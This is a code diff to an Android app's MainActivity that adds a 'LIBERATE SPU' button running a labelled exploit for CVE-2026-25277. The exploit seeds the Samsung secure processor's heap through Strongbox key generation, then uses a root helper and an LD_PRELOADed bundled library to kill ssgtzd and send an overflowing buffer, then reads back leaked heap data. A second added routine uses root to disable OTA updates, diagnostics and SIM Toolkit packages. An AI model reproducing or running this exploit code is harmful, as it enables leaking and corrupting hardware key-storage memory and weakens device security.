@@ -11,7 +11,11 @@ import android.graphics.Color;
 import android.graphics.Typeface;
 import android.view.Gravity;
 import android.widget.LinearLayout;
+import android.security.keystore.KeyGenParameterSpec;
+import android.security.keystore.KeyProperties;
 import java.io.*;
+import java.security.KeyPairGenerator;
+import java.security.KeyStore;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -92,6 +96,39 @@ public class MainActivity extends Activity {
         buttons.addView(statusButton);
 
         root.addView(buttons);
+
+        // Second row: SPU + Surveillance buttons
+        LinearLayout row2 = new LinearLayout(this);
+        row2.setOrientation(LinearLayout.HORIZONTAL);
+        row2.setGravity(Gravity.CENTER);
+        row2.setPadding(0, 8, 0, 0);
+
+        Button spuButton = new Button(this);
+        spuButton.setText("LIBERATE SPU");
+        spuButton.setTextColor(Color.BLACK);
+        spuButton.setBackgroundColor(Color.parseColor("#FF4444"));
+        spuButton.setTextSize(12);
+        spuButton.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
+        spuButton.setPadding(24, 16, 24, 16);
+        spuButton.setOnClickListener(v -> startSpuAttack());
+        row2.addView(spuButton);
+
+        Button killButton = new Button(this);
+        killButton.setText("KILL SPYWARE");
+        killButton.setTextColor(Color.BLACK);
+        killButton.setBackgroundColor(Color.parseColor("#FFAA00"));
+        killButton.setTextSize(12);
+        killButton.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
+        killButton.setPadding(24, 16, 24, 16);
+        LinearLayout.LayoutParams klp = new LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.WRAP_CONTENT,
+            LinearLayout.LayoutParams.WRAP_CONTENT);
+        klp.setMargins(16, 0, 0, 0);
+        killButton.setLayoutParams(klp);
+        killButton.setOnClickListener(v -> killSurveillance());
+        row2.addView(killButton);
+
+        root.addView(row2);
 
         scrollView = new ScrollView(this);
         scrollView.setPadding(0, 16, 0, 0);
@@ -299,6 +336,174 @@ public class MainActivity extends Activity {
                 }
             } catch (Exception e) {
                 log("[-] Not rooted: " + e.getMessage());
+            }
+        });
+    }
+
+    // ================================================================
+    // SPU LIBERATION — CVE-2026-25277 Buffer Overflow Attack
+    // Step 1: Seed SPU heap via Android KeyStore API (Strongbox)
+    // Step 2: Kill ssgtzd, register sp_keymaster, SEND overflow bomb
+    // Step 3: The overflow reads our seeded data from the heap!
+    // ================================================================
+    private void startSpuAttack() {
+        log("");
+        log("========================================");
+        log("  SPU LIBERATION — CVE-2026-25277");
+        log("  Buffer Overflow + Heap Seed Attack");
+        log("========================================");
+        log("");
+
+        executor.execute(() -> {
+            try {
+                String dir = getFilesDir().getAbsolutePath();
+                String rootHelper = dir + "/" + ROOT_HELPER;
+
+                // Phase 1: Seed SPU heap via Android KeyStore API
+                log("[*] Phase 1: Seeding SPU heap via KeyStore API...");
+                seedStrongboxHeap();
+
+                // Phase 2: Extract and run the PROVEN overflow tool
+                log("[*] Phase 2: Running SPU overflow (kill → register → SEND)...");
+                extractAsset("spu_kill_and_bomb.so", dir + "/spu_attack.so");
+                exec("chmod 755 " + dir + "/spu_attack.so");
+
+                // Write ssgtzd PID for the tool
+                String pidResult = exec(rootHelper + " -c 'pidof ssgtzd'");
+                writeFile(dir + "/.ssgtzd_pid", pidResult.trim());
+                log("[+] ssgtzd PID: " + pidResult.trim());
+
+                // Fire the PROVEN overflow: kill ssgtzd → register → SEND(len=0x1000)
+                String attackResult = exec(rootHelper + " -c '"
+                    + "LD_PRELOAD=" + dir + "/spu_attack.so /system/bin/true 2>&1'");
+                log(attackResult);
+
+                // Phase 3: Read results
+                log("[*] Phase 3: Reading SPU attack results...");
+                String results = exec(rootHelper + " -c 'cat /data/local/tmp/killbomb.txt 2>/dev/null"
+                    + " || cat /data/local/tmp/kill_recv.txt 2>/dev/null"
+                    + " || echo NO_OUTPUT'");
+                log(results);
+
+                // Phase 4: Verify SPU state
+                log("[*] Phase 4: Post-attack SPU check...");
+                // Try KeyStore operation to see if SPU behavior changed
+                try {
+                    KeyStore ks = KeyStore.getInstance("AndroidKeyStore");
+                    ks.load(null);
+                    boolean hasKey = ks.containsAlias("jackknife_test");
+                    log("[+] KeyStore accessible: " + !hasKey + " (no crash)");
+                } catch (Exception e) {
+                    log("[!] KeyStore error after attack: " + e.getMessage());
+                    log("[!] *** SPU STATE MAY BE CORRUPTED! ***");
+                }
+
+                log("");
+                log("[+] SPU attack complete. Check results above.");
+
+            } catch (Exception e) {
+                log("[!] SPU attack error: " + e.getMessage());
+            }
+        });
+    }
+
+    private void seedStrongboxHeap() {
+        // Use Android KeyStore API to generate keys targeting Strongbox
+        // This causes ssgtzd to send commands to the SPU,
+        // allocating heap buffers with our controlled parameters
+        try {
+            log("[*] Generating Strongbox key (seeds SPU heap)...");
+
+            // Try to generate an EC key in Strongbox
+            KeyPairGenerator kpg = KeyPairGenerator.getInstance(
+                KeyProperties.KEY_ALGORITHM_EC, "AndroidKeyStore");
+
+            KeyGenParameterSpec.Builder specBuilder = new KeyGenParameterSpec.Builder(
+                "jackknife_spu_seed_" + System.currentTimeMillis(),
+                KeyProperties.PURPOSE_SIGN | KeyProperties.PURPOSE_VERIFY)
+                .setDigests(KeyProperties.DIGEST_SHA256)
+                .setAlgorithmParameterSpec(
+                    new java.security.spec.ECGenParameterSpec("secp256r1"));
+
+            // Try Strongbox first, fall back to TEE
+            try {
+                specBuilder.setIsStrongBoxBacked(true);
+                log("[+] Requesting Strongbox-backed key...");
+            } catch (Exception e) {
+                log("[*] Strongbox flag not available, using TEE...");
+            }
+
+            // Set large attestation challenge to maximize heap allocation
+            byte[] challenge = new byte[128];
+            for (int i = 0; i < 128; i++) challenge[i] = (byte)(0x41 + (i % 26));
+            specBuilder.setAttestationChallenge(challenge);
+
+            kpg.initialize(specBuilder.build());
+
+            // Generate! This triggers SPU communication via ssgtzd
+            java.security.KeyPair kp = kpg.generateKeyPair();
+            log("[+] Key generated! SPU heap now has our attestation data");
+
+            // Generate a few more to fill the heap
+            for (int i = 0; i < 5; i++) {
+                String alias = "jackknife_seed_" + i + "_" + System.currentTimeMillis();
+                KeyGenParameterSpec.Builder sb = new KeyGenParameterSpec.Builder(
+                    alias, KeyProperties.PURPOSE_SIGN)
+                    .setDigests(KeyProperties.DIGEST_SHA256)
+                    .setAlgorithmParameterSpec(
+                        new java.security.spec.ECGenParameterSpec("secp256r1"))
+                    .setAttestationChallenge(challenge);
+                try { sb.setIsStrongBoxBacked(true); } catch (Exception e) {}
+                kpg.initialize(sb.build());
+                kpg.generateKeyPair();
+                log("[+] Seed key " + (i+1) + "/5 generated");
+            }
+
+        } catch (Exception e) {
+            log("[!] KeyStore seed error: " + e.getMessage());
+            log("[*] SPU heap may still have stale data from boot...");
+        }
+    }
+
+    // ================================================================
+    // SURVEILLANCE KILL — Permanently disable Samsung spyware
+    // ================================================================
+    private void killSurveillance() {
+        log("");
+        log("========================================");
+        log("  GHOSTLOCK SURVEILLANCE KILL");
+        log("========================================");
+        log("");
+
+        executor.execute(() -> {
+            try {
+                String dir = getFilesDir().getAbsolutePath();
+                String rootHelper = dir + "/" + ROOT_HELPER;
+
+                // Run the proven surveillance kill script
+                log("[*] Killing OTA, analytics, diagnostics, Bixby...");
+                String result = exec(rootHelper + " -c '"
+                    + "pm disable-user com.samsung.android.knox.analytics.uploader 2>/dev/null;"
+                    + "pm disable-user com.sec.android.diagmonagent 2>/dev/null;"
+                    + "pm disable-user com.samsung.android.networkdiagnostic 2>/dev/null;"
+                    + "pm disable-user com.sec.imslogger 2>/dev/null;"
+                    + "pm disable-user com.samsung.android.knox.pushmanager 2>/dev/null;"
+                    + "pm disable-user com.samsung.android.voc 2>/dev/null;"
+                    + "pm disable-user com.samsung.android.bixby.agent 2>/dev/null;"
+                    + "pm disable-user com.samsung.android.bixby.service 2>/dev/null;"
+                    + "pm disable-user com.samsung.android.app.spage 2>/dev/null;"
+                    + "pm disable-user com.samsung.android.forest 2>/dev/null;"
+                    + "pm disable-user com.samsung.android.app.updatecenter 2>/dev/null;"
+                    + "pm disable-user com.wssyncmldm 2>/dev/null;"
+                    + "pm disable-user com.android.stk 2>/dev/null;"
+                    + "pm disable-user com.android.stk2 2>/dev/null;"
+                    + "echo DONE'");
+                log(result);
+                log("[+] Surveillance KILLED! (persists across reboots)");
+                log("[+] SIM Toolkit BLOCKED!");
+
+            } catch (Exception e) {
+                log("[!] Kill error: " + e.getMessage());
             }
         });
     }
